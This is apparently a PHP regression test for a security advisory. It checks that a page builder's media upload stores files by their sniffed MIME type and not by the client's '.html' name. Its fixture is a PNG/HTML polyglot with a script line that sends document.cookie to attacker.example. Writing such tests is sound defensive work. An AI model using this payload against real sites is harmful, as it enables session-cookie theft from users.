<?php

declare(strict_types=1);

/*
 * GHSA-hj3q-8gc4-6mpw, F4 — /media/upload must not store a file under a
 * client-chosen extension. Owned by the runtime/media fix (MediaLibrary); this
 * test is expected to FAIL until that fix lands.
 */

use Andre\AiPageBuilder\Models\MediaItem;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;

it('stores an upload under the extension of its sniffed MIME, not the client name (.html polyglot)', function (): void {
    Storage::fake('public');

    // A real 1x1 PNG with HTML/JS appended: finfo still says image/png.
    $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg==');
    // A REAL UploadedFile (not ::fake(), whose MIME comes from the name), so
    // the `mimetypes:` rule sniffs the CONTENT exactly as in production.
    $tmp = tempnam(sys_get_temp_dir(), 'pb_polyglot_');
    file_put_contents($tmp, $png.'<script>fetch("https://attacker.example/?"+document.cookie)</script>');
    $polyglot = new UploadedFile($tmp, 'invoice.html', null, null, true);

    $this->actingAs(synapseAdmin())
        ->post('/ai-page-builder/media/upload', ['files' => [$polyglot]], ['Accept' => 'application/json'])
        ->assertOk();

    expect((string) MediaItem::query()->latest('id')->value('filename'))->toEndWith('.png');
});
